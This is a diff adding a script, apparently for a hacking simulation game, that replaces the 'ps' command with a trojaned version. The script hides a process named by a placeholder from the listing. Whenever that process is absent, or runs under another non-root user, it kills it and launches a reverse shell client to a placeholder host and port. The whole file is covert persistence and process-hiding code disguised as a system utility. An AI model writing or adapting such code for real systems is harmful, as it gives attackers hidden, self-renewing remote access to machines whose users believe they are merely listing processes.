@@ -1,0 +1,27 @@
+if params.len > 0 then exit(command_info("ps_usage"))
+output = get_shell.host_computer.show_procs
+newOutput = ["USER PID CPU MEM COMMAND"]
+hideProcess = ["*PN*"]
+foundOld = null
+m = include_lib("/lib/metaxploit.so")
+for line in output.split(char(10))
+	if hideProcess.indexOf(line.split(" ")[-1]) == null and line.split(" ")[-1] != "COMMAND" then
+		newOutput.push(line)
+	else if hideProcess.indexOf(line.split(" ")[-1]) != null and line.split(" ")[-1] != "COMMAND" then
+		foundOld = [line.split(" ")[0], line.split(" ")[1]]
+	end if
+end for
+if not foundOld then
+	if m then m.rshell_client("*IP*",*P*,"*PN*")
+else
+	if foundOld[0] != "root" then
+		if home_dir.split("/")[-1] != foundOld[0] then
+			if m then
+				get_shell.host_computer.close_program(foundOld[1].to_int)
+				m.rshell_client("*IP*",*P*,"*PN*")
+			end if
+		end if
+	end if
+end if
+newOutput = newOutput.join(char(10))
+print(format_columns(newOutput))
